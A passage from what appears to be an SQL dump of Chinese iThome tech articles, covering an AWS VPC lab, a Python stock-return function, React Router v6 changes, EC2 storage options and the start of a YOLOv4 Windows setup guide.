vpc-001（下圖#1）<br>\n(2)給VPC一個網路空間10.1.0.0/16（下圖#2），16代表1切在第二個位置<br>\n(3)其他用預設值<br>\n(4)最後按下 Create（下圖#3）</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009510Ee0Ne1Yxt.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009510Ee0Ne1Yxt.png"></p>\n<h4>建立 Public Subnet</h4>\n<p>現在可以看到 vpc-001已經被建立起來，下一步就是建立Public Subnet。點選左側Subnets tag。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951embsF7gG0E.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951embsF7gG0E.png"></p>\n<p>點擊Create subnet。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Q9be4kSBwc.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Q9be4kSBwc.png"></p>\n<h4>創造 Public Subnet 步驟</h4>\n<p>(1) 給 Subnet 一個名稱 public-subnet（下圖#1），因為等下要將此 Subnet 變成 Public<br>\n(2) VPC 選擇剛剛建立的 vpc-001（下圖#2）<br>\n(3) Availability Zone 任意選擇一個即可（下圖#3）<br>\n(4)給Subnet一個小於VPC（下圖#4）的網路空間10.1.1.0/24（下圖#5），24代表1切在第三個位置<br>\n(5)其他用預設值<br>\n(6)最後按下Create（下圖#6）</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Fo6Uj9ZbHD.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Fo6Uj9ZbHD.png"></p>\n<h4>建立 Internet Gateway</h4>\n<p>此時建立好的 Subnet 並非 Public，要讓其變成 Public，先點擊左側Internet Gateways tag。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951wX6SRrwDVY.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951wX6SRrwDVY.png"></p>\n<p>點擊 Create Internet gateway。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DFEtF3VIDg.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DFEtF3VIDg.png"></p>\n<p>給它一個名稱 my-igw（下圖#1），再按下 Create（下圖#2）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gpljp3C9ur.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951gpljp3C9ur.png"></p>\n<h4>連結 VPC 與 Internet gateway</h4>\n<p>此時建立好的 Internet gateway 為 detached 狀態（下圖#1），代表並沒有被任何 VPC 使用，點擊上方 Actions（下圖#2），選擇 Attach to VPC（下圖#3）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ydRUnu7QkH.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951ydRUnu7QkH.png"></p>\n<p>VPC 選擇剛剛建立的 vpc-001（下圖#1），再按下 Attach（下圖#2）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OdDPTY6EJT.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951OdDPTY6EJT.png"></p>\n<p>完成之後可看到 State 變成 attached，代表此 igw 已經被此 VPC 使用。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951v187QRU0FT.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951v187QRU0FT.png"></p>\n<h4>連結 Subnet 與 Internet gateway</h4>\n<p>再點選左側的 Subnets tag 回到 Subnet。<br>\n進入 Subnets 介面後（下圖#1），點擊下方 Route Table（下圖#2），點擊 Route Table（下圖#3）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951C43EZsnYB5.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951C43EZsnYB5.png"></p>\n<p>進入 Route Tables 介面後（下圖#1），將其名稱改為 public-route-table（下圖#2）。</p>\n<p>看到下方的 Routes（下圖#3），已經有預設值 Destination（下圖#4），也就是 VPC 的位置，所有裡面的網路流動都會經過中繼站 local。</p>\n<p>點擊 Edit routes（下圖#5）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951GwxeFumgVE.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951GwxeFumgVE.png"></p>\n<p>點擊 Add route（下圖#1），讓它去任何地方，尤其是 Internet 的時候（下圖#2），把它導到 Internet gateway，選擇剛剛建立的 my-igw（下圖#3），再按下 Save routes（下圖#4）。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951IQB6VrejEy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951IQB6VrejEy.png"></p>\n<p>現在可以看到 Routes 已經有兩個設定，第二個設定是去 Internet 的時候，它會導到剛剛建立的igw。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951yAKX2mZENr.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951yAKX2mZENr.png"></p>\n<p>此時已經成功建立了一個 Public Subnet 的網路空間。</p>\n<h4>小結</h4>\n<p>到這邊，我們已經完成 Public Subnet 網路部分的建造，其中最重要的則為 IGW 與 Route Table 的相互設定。</p>\n<h4>What''s Next?</h4>\n<p>明天我們將接著介紹「【Lab】VPC外網 Public Subnet to the Internet (IGW) (下)」。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-12 06:16:29');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10260208','[Day4] 函數打包與買進持有報酬率試算','從零開始使用python打造簡易投資工具','4',replace('\n                        <div class="markdown__style">\n                                                            <p>一開始先把前面的那些程式碼打包起來方便使用，首先先把前面的程式碼全部複製到一個新的python檔案裏面，到目前為止有用到的功能有<br>\n1.登入<br>\n2.抓取1分K<br>\n3.抽取1分K的收盤價<br>\n4.1分收盤價轉日收盤價<br>\n5.均線交叉訊號製作</p>\n<h1>登入</h1>\n<p>登入的部分會需要的有帳號密碼，還要告訴shioaji用模擬模式還是真倉模式，我這邊採取的作法是帳號密碼要用的時候自己手動輸入就好了，可以把帳密放在文字檔裡面要用直接貼上去就好，或者用一些密碼管理工具也可以，函數需要輸入的就只剩下模擬模式開關的那個<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238dfB3synpLq.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238dfB3synpLq.png"></p>\n<h1>抓取1分K</h1>\n<p>這邊會需要輸入股票ID，開始時間和結束時間，由於shioaji同時支援期貨和股票的報價，這邊函數名字特別寫"股票"K線<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238b3SmHQ9eqo.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238b3SmHQ9eqo.png"></p>\n<h1>抽取1分K的收盤價</h1>\n<p>這邊輸入前面的1分K和欄位名稱，欄位名稱填''close''就會抽取收盤價的部分，未來也能用這個函數抽取開盤價或成交量之類的<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238HaJfCTJVhb.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238HaJfCTJVhb.png"></p>\n<h1>轉換成日收盤價</h1>\n<p>這邊就輸入1分收盤價還有一個引數告訴他要算開盤還收盤價，開盤收盤以外的東西要用到再加<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238w7HoODsjqN.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238w7HoODsjqN.png"></p>\n<h1>均線交叉訊號製作</h1>\n<p>輸入日收盤價，還有長短均的週期輸出買賣訊號，其實可以加上一些判斷式來檢查有沒有無效值，但這邊用簡潔一點的寫法<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238YmVcBBpLrn.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238YmVcBBpLrn.png"></p>\n<p>經過以上的打包之後，只要用以下少少幾行就可以做到前兩天的事情<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238pPGpXAaH4C.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238pPGpXAaH4C.png"><br>\n以下是執行結果<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238uKPBVhCDmX.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238uKPBVhCDmX.png"></p>\n<p>如果是要計算資料裡面第A日到第B日的買進持有的報酬率用以下的period_profit函數就可以做到了，因為我這邊用的訊號都是收盤產生，隔天開盤作進出，所以這邊是用開盤價來算報酬率，如果操作上是收盤價進場的話可以用收盤價來計算損益。這個例子是計算開盤第1天買進到第11天開盤為止的報酬率。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/20141238zguei5Qj5Z.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/20141238zguei5Qj5Z.png"></p>\n<p>以下是執行結果，從2018/12/07到2018/12/20的報酬率是-0.0086。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210904/201412386IToxK0dE0.png" alt="https://ithelp.ithome.com.tw/upload/images/20210904/201412386IToxK0dE0.png"></p>\n<p>有了今天弄的這些基礎建設，明天就可以正式弄回測的部分了。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-04 21:46:05');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10282773','[Bonus 系列] - 來看看 React Router v6 有什麼新功能?和 v5 有哪些地方不同?','用30天更加認識 React.js 這個好朋友','31',replace('\n                        <div class="markdown__style">\n                                                            <p>在 2021 年 11 月初，React Router 正式釋出 v6 版本，身為 React 開發者已經按捺不住好奇心，想看看這個版本究竟增加了什麼功能?修改了什麼語法?因此就有了這篇文章的誕生。而在這篇文章中，我會介紹 v6 的一些新功能和 v5 有哪些地方不同。</p>\n<h3>1. Switch 元件被 Routes 取代，傳遞 props 元件的方式也做了調整，出現了新的 props，element</h3>\n<p>v5:</p>\n<pre><code class="language-jsx">&lt;Switch&gt;\n  &lt;Route path="/about"&gt;\n    &lt;About /&gt;\n  &lt;/Route&gt;\n  &lt;Route path="/topics"&gt;\n    &lt;Topics /&gt;\n  &lt;/Route&gt;\n  &lt;Route path="/"&gt;\n    &lt;Home /&gt;\n  &lt;/Route&gt;\n&lt;/Switch&gt;\n</code></pre>\n<p>v6:</p>\n<pre><code class="language-jsx">&lt;Routes&gt;\n  &lt;Route path="/about" element={&lt;About /&gt;} /&gt;\n  &lt;Route path="/topics" element={&lt;Topics /&gt;} /&gt;\n  &lt;Route path="/" element={&lt;Home /&gt;} /&gt;\n&lt;/Routes&gt;\n</code></pre>\n<h3>2. Router 變聰明了，不用再加上 exact</h3>\n<p>在過去，需透過 exact 設定完全符合 url 時才會顯現指定的元件內容，現在 Router 會抓取最相近的 url 去呈現對應的元件。</p>\n<pre><code class="language-jsx">&lt;Routes&gt;\n  &lt;Route path="/about" element={&lt;About /&gt;} /&gt;\n  &lt;Route path="/topics" element={&lt;Topics /&gt;} /&gt;\n  &lt;Route path="/topics/:topic" element={&lt;SpecTopics /&gt;} /&gt;\n  &lt;Route path="/" element={&lt;Home /&gt;} /&gt;\n&lt;/Routes&gt;\n</code></pre>\n<h3>3. NavLink 的 activeClassName prop 被移除</h3>\n<p>在 <a href="https://v5.reactrouter.com/web/api/NavLink" target="_blank">React Router v5 的官網</a>有提到 activeClassName 被移除，v6 直接用 className 去判定即可。</p>\n<pre><code class="language-jsx">&lt;NavLink className={(navData) =&gt; navData.isActive ? "active" : "" } to="/about" /&gt;\n</code></pre>\n<h3>4. 簡化巢狀路由、推出 Outlet API</h3>\n<p>之前的版本需要搭配 useRouteMatch 去組出巢狀路由，現在可以直接寫上想要的子路由上去。</p>\n<p>v5:</p>\n<pre><code class="language-jsx">export default function Topics() {\n  let match = useRouteMatch();\n  console.log(match);\n\n  return (\n    &lt;div&gt;\n      &lt;ul&gt;\n        &lt;li&gt;\n          &lt;Link to={`${match.url}/components`}&gt;Components&lt;/Link&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n          &lt;Link to={`${match.url}/props-v-state`}&gt;Props v. State&lt;/Link&gt;\n        &lt;/li&gt;\n      &lt;/ul&gt;\n\n      &lt;Switch&gt;\n        &lt;Route path={`${match.path}/:topicId`}&gt;\n          &lt;Topic /&gt;\n        &lt;/Route&gt;\n        &lt;Route path={match.path}&gt;\n          &lt;h3&gt;Please select a topic.&lt;/h3&gt;\n        &lt;/Route&gt;\n      &lt;/Switch&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre>\n<p>v6:</p>\n<pre><code class="language-jsx">export default function Topics() {\n  return (\n    &lt;div&gt;\n      &lt;h2&gt;Topics&lt;/h2&gt;\n\n      &lt;ul&gt;\n        &lt;li&gt;\n          &lt;Link to="components"&gt;Components&lt;/Link&gt;\n        &lt;/li&gt;\n        &lt;li&gt;\n          &lt;Link to="props-v-state"&gt;Props v. State&lt;/Link&gt;\n        &lt;/li&gt;\n      &lt;/ul&gt;\n\n      &lt;Routes&gt;\n        &lt;Route path=":topicId" element={&lt;Topic /&gt;} /&gt;\n        &lt;Route path="*" element={&lt;h3&gt;Please select a topic.&lt;/h3&gt;} /&gt;\n      &lt;/Routes&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre>\n<p>另外在 path 有沒有加上 ''/'' 結果都是一樣的:</p>\n<pre><code class="language-jsx">// 路由為 `/hobby/favorite`\n&lt;Route\n  path="favorite"\n  element={&lt;FavoriteHobbyListBody /&gt;}\n/&gt;\n\n// 路由也為 `/hobby/favorite`\n&lt;Route\n  path="/favorite"\n  element={&lt;FavoriteHobbyListBody /&gt;}\n/&gt;\n</code></pre>\n<h4>Outlet api 也是建立巢狀路由的一大利器，以下為官方提供的範例。</h4>\n<p>在 Dashboard 元件內部，會根據路由 <code>/messages</code> 或 <code>/tasks</code> 在 <code>&lt;Outlet /&gt;</code> 的地方呈現對應的元件 <code>&lt;DashboardMessages /&gt;</code> or <code>&lt;DashboardTasks&gt;</code>。</p>\n<pre><code class="language-jsx">function Dashboard() {\n  return (\n    &lt;div&gt;\n      &lt;h1&gt;Dashboard&lt;/h1&gt;\n      {/* This element will render either &lt;DashboardMessages&gt; when the URL is\n          "/messages", &lt;DashboardTasks&gt; at "/tasks", or null if it is "/"\n      */}\n      &lt;Outlet /&gt;\n    &lt;/div&gt;\n  );\n}\n\nfunction App() {\n  return (\n    &lt;Routes&gt;\n      &lt;Route path="/" element={&lt;Dashboard /&gt;}&gt;\n        &lt;Route\n          path="messages"\n          element={&lt;DashboardMessages /&gt;}\n        /&gt;\n        &lt;Route path="tasks" element={&lt;DashboardTasks /&gt;} /&gt;\n      &lt;/Route&gt;\n    &lt;/Routes&gt;\n  );\n}\n</code></pre>\n<h3>5. useNavigate 代替了 useHistory</h3>\n<p>useNavigate 的第一個參數可以是路由或是數字，代表前進或回去的頁數。</p>\n<h4>範例1:</h4>\n<p>v5:</p>\n<pre><code class="language-jsx">import { useHistory } from "react-router-dom";\n\nconst News = () =&gt; {\n  let history = useHistory();\n\n  return (\n    &lt;&gt;\n      &lt;button onClick={()=&gt; history.push("/home")}&gt;Home&lt;/button&gt;\n    &lt;/&gt;\n  );\n}\n</code></pre>\n<p>v6:</p>\n<pre><code class="language-jsx">import { useNavigate } from "react-router-dom";\n\nconst News = () =&gt; {\n  let navigate = useNavigate();\n\n  return (\n    &lt;&gt;\n      &lt;button onClick={()=&gt; navigate(''/home'')}&gt;Home&lt;/button&gt;\n    &lt;/&gt;\n  );\n}\n</code></pre>\n<h4>範例2:</h4>\n<p>v5:</p>\n<pre><code class="language-jsx">import { useHistory } from "react-router-dom";\n\nfunction Exchanges() {\n  const { go, goBack, goForward } = useHistory();\n\n  return (\n    &lt;&gt;\n      &lt;button onClick={() =&gt; go(-2)}&gt;\n        2 steps back\n      &lt;/button&gt;\n      &lt;button onClick={goBack}&gt;1 step back&lt;/button&gt;\n      &lt;button onClick={goForward}&gt;1 step forward&lt;/button&gt;\n      &lt;button onClick={() =&gt; go(2)}&gt;\n        2 steps forward\n      &lt;/button&gt;\n    &lt;/&gt;\n  );\n}\n\n</code></pre>\n<p>v6:</p>\n<pre><code class="language-jsx">import { useNavigate } from "react-router-dom";\n\nfunction Exchanges() {\n  const navigate = useNavigate();\n\n  return (\n    &lt;&gt;\n      &lt;button onClick={() =&gt; navigate(-2)}&gt;\n        2 steps back\n      &lt;/button&gt;\n      &lt;button onClick={() =&gt; navigate(-1)}&gt;1 step back&lt;/button&gt;\n      &lt;button onClick={() =&gt; navigate(1)}&gt;\n        1 step forward\n      &lt;/button&gt;\n      &lt;button onClick={() =&gt; navigate(2)}&gt;\n        2 steps forward\n      &lt;/button&gt;\n    &lt;/&gt;\n  );\n}\n</code></pre>\n<blockquote>\n<p>除了 useNavigate hook 外，v6 也提供了 <a href="https://reactrouter.com/docs/en/v6/api#navigate" target="_blank"></a>元件。</p>\n</blockquote>\n<h3>6. useRoutes 代替 react-router-config</h3>\n<p><a href="https://reactrouter.com/docs/en/v6/api#useroutes" target="_blank">useRoutes 官網說明</a></p>\n<pre><code class="language-jsx">import React from "react";\nimport { useRoutes } from "react-router-dom";\n\nconst App = () =&gt; {\n  let element = useRoutes([\n    {\n      path: "/",\n      element: &lt;Dashboard /&gt;,\n      children: [\n        {\n          path: "messages",\n          element: &lt;DashboardMessages /&gt;\n        },\n        { path: "tasks", element: &lt;DashboardTasks /&gt; }\n      ]\n    },\n    { path: "team", element: &lt;AboutPage /&gt; }\n  ]);\n\n  return element;\n}\n</code></pre>\n<h3>7. 其他功能</h3>\n<p>除了上述幾點之外，當然還有其他的變更，像是 React Router v6 整個 bundle size 縮小，更加輕量，不過以上就舉比較常用的幾點來說明，想了解更深入可以點擊我推薦的 youtube 影片或是到官網去閱讀文件囉!</p>\n<ul>\n<li>\n<a href="https://youtu.be/zEQiNFAwDGo" target="_blank">Youtube Academind: React Router 6 - What Changed &amp; Upgrading Guide</a>\n</li>\n<li>\n<a href="https://youtu.be/0cSVuySEB0A" target="_blank">React Router v6 in depth guide</a>\n</li>\n<li>\n<a href="https://reactrouter.com/docs/en/v6/getting-started/overview" target="_blank">React Router v6 官網</a>\n</li>\n</ul>\n<hr>\n<p>最後，放上在<a href="https://ithelp.ithome.com.tw/articles/10276683" target="_blank">鐵人賽 Day19 文章</a>中介紹 React Router v5 的範例程式碼和修改後的 v6 版本程式碼範例提供給讀者做比較，不過範例中並沒有將文中的全部功能都使用上去，讀者可以自行練習看看哩!</p>\n<p><a href="https://codesandbox.io/s/friendly-flower-zj1ok" target="_blank">v5 版本 codesandbox 範例</a><br>\n<a href="https://codesandbox.io/s/gifted-easley-jghgu" target="_blank">v6 版本 codesandbox 範例</a></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Modern Web',NULL,'2021-11-25 09:12:59');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10264261','Day 10 運算寶石：EC2 儲存資源 Instance Store vs Elastic Block Storage (EBS)','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','10',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg"></p>\n<p>現在我們來介紹 EC2 裡面的 Instance Storage 與 EBS 的差別，那我們開始吧!</p>\n<h4>EC2 Instance 與 EBS Volume 的關係介紹</h4>\n<p>在我們的 EC2 Instance 裡面，會有一個 Instance Storage，他們都會在同一個 Host 主機上，而我們可以透過網路連結到另外的外接硬碟空間，名叫 EBS Volume (Elastic Block Storage)。而 EC2 Instance 與 EBS Volume 會在同一個 AZ 之中，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BmkKp6K37M.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951BmkKp6K37M.png"></p>\n<p>EBS Volume 可以進行備份，而 AWS 所提供的備份功能就叫做 EBS Snapshot。EBS Snapshot 有一個特點，他會進行漸進式的備份 (backup)，也就是說，上次備份到的部分，下次就不會重複備份，只會加上新的部分，而這種漸進式的方法就叫做 Incremental，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951IDuuCSkKvw.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951IDuuCSkKvw.png"></p>\n<p>另外，EBS Snapshot 會與 EC2 Instance 在同一個 Region 中。<br>\n因此 EC2 Instance、EBS Volume、EBS Snapshot 三者的關係就會如下圖：<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951MvCFqgEnlL.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951MvCFqgEnlL.png"></p>\n<h4>EBS 與 Instance Storage 的優缺點比較</h4>\n<h4>Instance Storage</h4>\n<p><strong>優點:</strong> Higher I/O，由於 Instance Storage 和 EC2 Instance 在同一個Host之中，因此具有很好的 I/O 處理能力。<br>\n<strong><code>缺點</code>:</strong> Ephemeral，短暫存在。就是說當我們把 EC2 Instance 給刪除時，在 Instance Storage 的資料也會全部跟著消失。<br>\n<strong><code>缺點</code>:</strong> No Backup，就算沒有實際把 EC2 Instance 砍掉，只要他所在的實體主機儲存硬碟故障，那麼資料也都會跟著消失，換句話說，他的 Durability 非常低，不適合存放長久資料。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210915/20100951EYKi8MK6n0.png" alt="https://ithelp.ithome.com.tw/upload/images/20210915/20100951EYKi8MK6n0.png"></p>\n<h4>EBS</h4>\n<p><strong><code>缺點</code>:</strong> Lower I/O，由於 EBS 與 EC2 之間連通內部網路會造成時間消耗，因此 I/O 的處理能力較低。<br>\n<strong>優點:</strong> Persistent，EBS Volume 的生命週期與 EC2 的出現消失無關，就算 EC2 砍掉，EBS Volume 的資料依舊會留存著。<br>\n<strong>優點:</strong> Backup，當我們創造 EBS Volume 時，在背後的 AZ 之中，AWS 會在背後幫我們建立多台儲存設備，簡稱 Nodes，來組成 EBS Volume，就算有一個儲存硬碟故障了，資料仍然能完整保存，提供較高的 Durability。</p>\n<p>另外，不僅僅是 EBS Volume 上的 Backup 功能可以使用，我們還有 EBS Snapshot 來保護資料，就算 AZ 所有資料中心都無法使用，資料仍會保存在同一個 Region 底下的 EBS Snapshot。</p>\n<p>Instance Storage 與 EBS 兩者優缺點比較如下圖:<br>\n(左為Instance Storage，右為EBS Volume)<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210915/20100951qGNlyRMs8p.png" alt="https://ithelp.ithome.com.tw/upload/images/20210915/20100951qGNlyRMs8p.png"></p>\n<h4>小結</h4>\n<p>整體而言相較於 Instance Storage，EBS為更常用的儲存選擇。原因很簡單，以使用者的角度來看，在儲存東西時最重要的就是「保障」，確保資料不會遺失，EBS也提供了相對較高的 Durability。</p>\n<p>然而，我們仍然存在一個 EBS I/O 相對較低的問題，為了解決這個問題， AWS 提供給我們許多不同的 EBS Type 來選擇，在之後會有單元進行詳細說明。</p>\n<p>那以上，是我們針對 EC2 儲存資源 Instance Storage 與 Elastic Block Storage (EBS) 之間的比較與介紹。</p>\n<h4>What''s Next?</h4>\n<p>明天我們將接著介紹「EC2儲存資源 EBS Types 方案比較」。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-15 11:33:27');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10282327','【第31天】番外篇-Windows + YOLOV4 本地端訓練','手寫中文字之影像辨識','31',replace('\n                        <div class="markdown__style">\n                                                            <h3>摘要</h3>\n<ol>\n<li>前言</li>\n<li>工具</li>\n<li>流程</li>\n</ol>\n<hr>\n<h3>前言</h3>\n<ol>\n<li>\n<a href="https://ithelp.ithome.com.tw/articles/10269483" target="_blank">【第3天】資料前處理-YOLOv4與自動框選中文字</a>曾提及，Windows + YOLOV4在呼叫本地端GPU時出現異常，因而部署到Colab訓練。</li>\n<li>然而，使用免費Colab GPU訓練時，若訓練樣本數量超過3000張，上傳檔案耗費大量時間(40~60分鐘)，且可能訓練到一半Colab斷線，導致前功盡棄。(變相地限制了樣本數量)</li>\n<li>故近期參考網路上分享文章，嘗試在Windows編譯Darknet與本地端訓練YOLOV4模型，提高訓練樣本數與模型訓練效率。</li>\n<li>在YOLOV4 Darknet環境部署時BUG頻發，整整踩了2天的坑，想起來還是一陣後怕。此次撰文和大家分享YOLOV4部署到Windows本地端可能遭遇的問題與解決方法。同時，也是做個筆記，下次部署時，同樣的坑可不想踩第2次了。</li>\n</ol>\n<hr>\n<h3>工具</h3>\n<ol>\n<li>\n<p>更新顯卡驅動程式：詳細請參閱<a href="https://ithelp.ithome.com.tw/articles/10269483" target="_blank">【第3天】資料前處理-YOLOv4與自動框選中文字</a></p>\n</li>\n<li>\n<p>Visual stutio 2019 與 Microsoft Visual C++ 2015-2019：建議先安裝Visual stutio 2019 與 Microsoft Visual C++ 2015-2019，再安裝CUDA與cuDNN。</p>\n<p>2.1 下載：請點擊<a href="https://visualstudio.microsoft.com/zh-hant/downloads/" target="_blank">此處</a></p>\n<p><img src="https://i.imgur.com/jf3ZhWP.png" alt=""></p>\n<p>2.2 安裝：</p>\n<ul>\n<li>\n<p>點擊安裝Visual stutio 2019</p>\n</li>\n<li>\n<p>勾選使用C++的桌面開發</p>\n<p><img src="https://i.imgur.com/SODNXPq.png" alt=""></p>\n</li>\n</ul>\n</li>\n<li>\n<p>CUDA與cuDNN：CUDA版本10.1、cuDNN版本7.6，詳細請參閱<a href="https://ithelp.ithome.com.tw/articles/10269483" target="_blank">【第3天】資料前處理-YOLOv4與自動框選中文字</a></p>\n</li>\n<li>\n<p>OpenCV：版本4.5.4</p>\n<p>4.1 下載：請點擊<a href="https://opencv.org/releases/" target="_blank">此處</a></p>\n<p><img src="https://i.imgur.com/Ct0aAcK.png" alt=""></p>\n<p>4.2 安裝並記下安裝路徑</p>\n<p><img src="https://i.imgur.com/JeUH3fg.png" alt=""></p>\n<p>4.3 新增環境變數(系統變數)</p>\n<ul>\n<li>\n<p>OpenDIR：<code>C:\Users\88691\Desktop\YOLOV4\opencv\build</code></p>\n<p><img src="https://i.imgur.com/gTIoid0.png" alt=""></p>\n</li>\n<li>\n<p>Path：<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\x64\vc15\bin</code></p>\n<p><img src="https://i.imgur.com/MiGjlaP.png" alt=""></p>\n</li>\n</ul>\n</li>\n<li>\n<p>Cmake：請點擊<a href="https://cmake.org/download/" target="_blank">此處</a>下載</p>\n<p><img src="https://i.imgur.com/vXGNchG.png" alt=""></p>\n</li>\n<li>\n<p>ZED SDK：請點擊<a href="https://www.stereolabs.com/developers/release/" target="_blank">此處</a>下載</p>\n<p><img src="https://i.imgur.com/ePcHtBw.png" alt=""></p>\n</li>\n<li>\n<p>AlexeyAB/darknet：請點擊<a href="https://github.com/AlexeyAB/darknet" target="_blank">此處</a>下載</p>\n<p><img src="https://i.imgur.com/lZvHXwO.png" alt=""></p>\n</li>\n</ol>\n<hr>\n<h3>流程</h3>\n<ol>\n<li>\n<p>建立專案</p>\n<p>1.1 開啟Visula Studio 2019，點擊建立新的專案。</p>\n<p><img src="https://i.imgur.com/HjLF90f.png" alt=""></p>\n<p>1.2 點擊空白專案。</p>\n<p><img src="https://i.imgur.com/qJcXuwE.png" alt=""></p>\n<p>1.3 點擊新增項目，並新增C++檔(.cpp)，供後續驗證OpenCV是否成功設定。</p>\n<p><img src="https://i.imgur.com/hONqa2d.png" alt=""></p>\n<p><img src="https://i.imgur.com/vUSahQs.png" alt=""></p>\n</li>\n<li>\n<p>設定OpenCV路徑</p>\n<p>2.1 點擊左下方「屬性管理員」，右鍵點擊release X64，並點選「加入新的屬性專案工作表」。</p>\n<p><img src="https://i.imgur.com/ZbLjOVI.png" alt=""></p>\n<p>2.2 設定「屬性專案工作表」</p>\n<p><img src="https://i.imgur.com/OP1WUDN.png" alt=""></p>\n<ul>\n<li>\n<p>點擊PropertySheet開啟屬性 → VC++目錄 → Include目錄 → 新增下列3個路徑。(上圖編號3)</p>\n<ul>\n<li>\n<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\include</code>\n</li>\n<li>\n<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\include\opencv</code>\n</li>\n<li>\n<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\include\opencv2</code>\n</li>\n</ul>\n<p><img src="https://i.imgur.com/9Zljr9v.png" alt=""></p>\n</li>\n<li>\n<p>VC++目錄 → 程式庫目錄 → 新增下列路徑。(上圖編號4)</p>\n<ul>\n<li>\n<code>C:\Users\88691\Desktop\YOLOV4\opencv\build\x64\vc15\lib</code>\n</li>\n</ul>\n<p>※ 注意：Visula Studio 2015選擇vc14；Visula Studio 2017、2019選擇vc15。</p>\n<p><img src="https://i.imgur.com/TFejVqB.png" alt=""></p>\n</li>\n<li>\n<p>連結器 → 輸入 → 其他相依性 → 新增下列路徑。</p>\n<ul>\n<li>\n<code>opencv_world454.lib</code>\n</li>\n</ul>\n<p><img src="https://i.imgur.com/EdHr7f0.png" alt=""></p>\n</li>\n<li>\n<p>驗證OpenCV正常啟用</p>\n<ul>\n<li>\n<p>將待驗證圖片放入Project2</p>\n<p><img src="https://i.imgur.com/xiTdX0p.png" alt=""></p>\n</li>\n<li>\n<p>程式碼：在剛剛新增的C++檔(.cpp)中輸入下列程式碼。</p>\n</li>\n</ul>\n<pre><code class="language-c++">//Opencv 僅支援64位元處理器\n#include &lt;opencv2/opencv.hpp&gt;\n#include &lt;iostream&gt;\n\nusing namespace std;\nusing namespace cv;\n\nint main() {\n	Mat img; //宣告一個儲存影像的矩陣\n    img = 